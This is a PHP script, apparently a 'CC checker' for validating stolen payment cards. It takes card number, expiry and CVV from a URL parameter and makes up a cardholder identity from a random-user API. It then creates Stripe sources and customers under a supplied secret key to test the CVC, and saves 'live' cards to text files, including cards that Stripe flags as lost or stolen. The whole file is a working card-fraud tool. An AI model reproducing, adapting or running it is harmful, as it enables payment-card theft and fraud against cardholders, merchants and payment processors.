<?php
/* Made By PHCH */
error_reporting(1);

/* Variables */
extract($_GET);
$explode = explode("|", $lista);
$cc = $explode[0];
$mm = $explode[1];
$yyyy = $explode[2];
$cvv = $explode[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
$amount2 = 'Not Charged';
$donot = 'Do Not Honor';
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$infos = json_decode($get, 1);
$name_first = $infos['results'][0]['name']['first'];
$name_last = $infos['results'][0]['name']['last'];
$name_full = ''.$name_first.' '.$name_last.'';

$location_street = $infos['results'][0]['location']['street'];
$location_city = $infos['results'][0]['location']['city'];
$location_state = $infos['results'][0]['location']['state'];
$location_postcode = $infos['results'][0]['location']['postcode'];
if ($location_state == "Alabama") {
    $location_state = "AL";
} else if ($location_state == "alaska") {
    $location_state = "AK";
} else if ($location_state == "arizona") {
    $location_state = "AR";
} else if ($location_state == "california") {
    $location_state = "CA";
} else if ($location_state == "colorado") {
    $location_state = "CO";
} else if ($location_state == "connecticut") {
    $location_state = "CT";
} else if ($location_state == "delaware") {
    $location_state = "DE";
} else if ($location_state == "district of columbia") {
    $location_state = "DC";
} else if ($location_state == "florida") {
    $location_state = "FL";
} else if ($location_state == "georgia") {
    $location_state = "GA";
} else if ($location_state == "hawaii") {
    $location_state = "HI";
} else if ($location_state == "idaho") {
    $location_state = "ID";
} else if ($location_state == "illinois") {
    $location_state = "IL";
} else if ($location_state == "indiana") {
    $location_state = "IN";
} else if ($location_state == "iowa") {
    $location_state = "IA";
} else if ($location_state == "kansas") {
    $location_state = "KS";
} else if ($location_state == "kentucky") {
    $location_state = "KY";
} else if ($location_state == "louisiana") {
    $location_state = "LA";
} else if ($location_state == "maine") {
    $location_state = "ME";
} else if ($location_state == "maryland") {
    $location_state = "MD";
} else if ($location_state == "massachusetts") {
    $location_state = "MA";
} else if ($location_state == "michigan") {
    $location_state = "MI";
} else if ($location_state == "minnesota") {
    $location_state = "MN";
} else if ($location_state == "mississippi") {
    $location_state = "MS";
} else if ($location_state == "missouri") {
    $location_state = "MO";
} else if ($location_state == "montana") {
    $location_state = "MT";
} else if ($location_state == "nebraska") {
    $location_state = "NE";
} else if ($location_state == "nevada") {
    $location_state = "NV";
} else if ($location_state == "new hampshire") {
    $location_state = "NH";
} else if ($location_state == "new jersey") {
    $location_state = "NJ";
} else if ($location_state == "new mexico") {
    $location_state = "NM";
} else if ($location_state == "new york") {
    $location_state = "LA";
} else if ($location_state == "north carolina") {
    $location_state = "NC";
} else if ($location_state == "north dakota") {
    $location_state = "ND";
} else if ($location_state == "Ohio") {
    $location_state = "OH";
} else if ($location_state == "oklahoma") {
    $location_state = "OK";
} else if ($location_state == "oregon") {
    $location_state = "OR";
} else if ($location_state == "pennsylvania") {
    $location_state = "PA";
} else if ($location_state == "rhode Island") {
    $location_state = "RI";
} else if ($location_state == "south carolina") {
    $location_state = "SC";
} else if ($location_state == "south dakota") {
    $location_state = "SD";
} else if ($location_state == "tennessee") {
    $location_state = "TN";
} else if ($location_state == "texas") {
    $location_state = "TX";
} else if ($location_state == "utah") {
    $location_state = "UT";
} else if ($location_state == "vermont") {
    $location_state = "VT";
} else if ($location_state == "virginia") {
    $location_state = "VA";
} else if ($location_state == "washington") {
    $location_state = "WA";
} else if ($location_state == "west virginia") {
    $location_state = "WV";
} else if ($location_state == "wisconsin") {
    $location_state = "WI";
} else if ($location_state == "wyoming") {
    $location_state = "WY";
} else {
    $location_state = "KY";
}

/* 1st cURL */
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&owner[name]=$name_full&owner[email]=$email&owner[address][line1]=$location_street&owner[address][city]=$location_city&owner[address][state]=$location_state&owner[address][postal_code]=$location_postcode&owner[address][country]=US&card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result1 = curl_exec($ch);
curl_close($ch);

/* 1st cURL Results */
$res1 = json_decode($result1, 1);
$src = $res1['id'];

if (isset($src)) {
    /* 2nd cURL */
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "description=PHbanned&source=$src");
    curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result2 = curl_exec($ch);
    curl_close($ch);

    /* 2nd cURL Results */
    $res2 = json_decode($result2, 1);
    $cus = $res2['id'];

}

if (isset($res2['id'])&&!isset($res2['sources'])) {
    /* 3rd cURL */
    $ch3 = curl_init();
    curl_setopt($ch3, CURLOPT_URL, "https://api.stripe.com/v1/customers/$cus/sources/$src");
    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch3, CURLOPT_USERPWD, $sec . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
    $curl3 = curl_exec($ch3);
    curl_close($ch3);

    /* 3rd cURL Response */
    $res3 = json_decode($curl3, true);

}




/* Response */

if (strpos($curl3, '"cvc_check":"pass"')) {
  fwrite(fopen('cvvtest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"cvc_check": "pass"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif(strpos($curl3, "Thank You For Donation." )) {
  fwrite(fopen('cvvtest.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"cvc_check": "pass"</span> <span class="badge badge-info"> Luffy</span></br>';

}
elseif(strpos($result2, "lost_card" )) {
fwrite(fopen('additional.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"lost_card"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif(strpos($result2, "stolen_card" )) {
fwrite(fopen('additional.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"stolen_card"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif(strpos($curl3, "pickup_card" )) {
fwrite(fopen('additional.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"pickup_card"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif(strpos($curl3,'"cvc_check": "pass",')){
      echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"cvc_check": "pass"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif(strpos($curl3, "Thank You." )) {
  fwrite(fopen('cvvtest.txt', 'a'), $lista."\r\n");
    echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"cvc_check": "pass"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif(strpos($curl3, 'security code is incorrect.' )) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span></span> <span class="badge badge-warning">security code is incorrect. Luffy</span></br>';
}
elseif(strpos($result2, 'security code is incorrect.' )) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span></span> <span class="badge badge-warning">security code is incorrect. Luffy</span></br>';
}
elseif(strpos($result2, "The card's security code is incorrect." )) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span></span> <span class="badge badge-warning">security code is incorrect. Luffy</span></br>';
}
elseif(strpos($curl3, "The card's security code is incorrect." )) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span></span> <span class="badge badge-warning">security code is incorrect. Luffy</span></br>';  
}
elseif(strpos($curl3, '"cvc_check": "fail"' )) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span></span> <span class="badge badge-warning">security code is incorrect. Luffy</span></br>'; 
}
elseif(strpos($result2, '"cvc_check": "fail"' )) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span></span> <span class="badge badge-warning">security code is incorrect. Luffy</span></br>';   
}
elseif(strpos($result1, '"cvc_check": "fail"' )) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span></span> <span class="badge badge-warning">security code is incorrect. Luffy</span></br>';   
}
elseif (strpos($curl3, "Your card's security code is incorrect.")) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span> </span> <span class="badge badge-warning"> security code is incorrect. Luffy</span></br>';
}
elseif (strpos($result2, "Your card's security code is incorrect.")) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span> </span> <span class="badge badge-warning"> security code is incorrect. Luffy</span></br>';
}
elseif (strpos($curl3, "incorrect_cvc")) {
  fwrite(fopen('ccntest.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">#Aprovada</span> <span class="badge badge-warning">CCN✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-warning">incorrect_cvc Luffy</span></br>';
}
elseif(strpos($curl3, 'Your card zip code is incorrect.' )) {
  fwrite(fopen('CVV.txt', 'a'), $lista."\r\n");
    echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"cvc_check": "pass"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif (strpos($curl3, "stolen_card")) {
  echo '<span class="badge badge-danger">DIE</span><span class="badge badge-success">' . $lista . '</span> <span class="badge badge-danger">stolen_card Luffy</span></br>';
}
elseif (strpos($curl3, "lost_card")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-danger">lost_card Luffy</span></br>';
}
elseif(strpos($curl3, 'Your card has insufficient funds.')) {
  fwrite(fopen('CVV.txt', 'a'), $lista."\r\n");
    echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">CVV MATCH✓</span> <span class="badge badge-secondary">' . $lista . '</span> </span> <span class="badge badge-success">"INSUFFICIENT FUNDS"</span> <span class="badge badge-info"> Luffy</span></br>';
}
elseif(strpos($curl3, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">Your card has expired. Luffy</span> </br>';
}
elseif (strpos($curl3, "pickup_card")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✓</span> <span class="badge badge-danger">pickup_card Luffy</span></br>';
}
elseif(strpos($curl3, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">Your card number is incorrect. Luffy</span> </br>';
}
elseif(strpos($result1, 'Your account cannot currently make live charges.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">TEST MODE CHARGES ONLY Luffy</span> </br>';
}
elseif(strpos($result1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">Sending credit card numbers directly to the Stripe API is generally unsafe.★𝕻𝖍𝖇𝖆𝖓𝖓𝖊𝖉★</span> </br>';
}
 elseif (strpos($curl3, "incorrect_number")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">incorrect_number Luffy</span> </br>';
}
elseif(strpos($curl3, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">your card was declined Luffy</span> </br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">your card was declined Luffy</span> </br>';
}
elseif (strpos($curl3, "generic_decline")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">Generic decline Luffy</span> </br>';
}
elseif (strpos($result1, "generic_decline")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">Generic decline Luffy</span> </br>';
}
elseif (strpos($curl3, "do_not_honor")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">Do_not_honor Luffy</span> </br>';
}
elseif (strpos($curl3, '"cvc_check": "unavailable"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">"cvc_check": "unavailable" Luffy</span> </br>';  
}
elseif (strpos($result2, '"cvc_check": "unavailable"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">"cvc_check": "unavailable" Luffy</span> </br>';
}
elseif (strpos($result1,'"code":"rate_limit"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">"REQUEST LIMIT" Luffy</span> </br>';   
}
elseif (strpos($result2,'"code":"rate_limit"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">"REQUEST LIMIT" Luffy</span> </br>';
}
elseif (strpos($curl3,'"code":"rate_limit"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">"REQUEST LIMIT" Luffy</span> </br>';
}
elseif (strpos($curl3, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">"cvc_check": "unchecked" Luffy</span> </br>';
}
elseif (strpos($curl3, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">"cvc_check": "fail" Luffy</span> </br>';
}
elseif (strpos($curl3, "expired_card")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">expired_card Luffy</span> </br>';
}
elseif (strpos($curl3,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">Does Not support the purchase Luffy</span> </br>';
}
 else {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">✕</span> <span class="badge badge-danger">[D-code] CODE ERROR  Luffy</span> </br>';
}

function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@gmail.com';
}
curl_close($curl);
  ob_flush();
/*else {
    echo '<span class="badge badge-dark"></span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> '.$err1.' </span></span>  <span class="badge badge-info">PHCH</span> </br>';
}
//echo$curl3;
/* Made by PHCH */
// echo $curl3;
?>
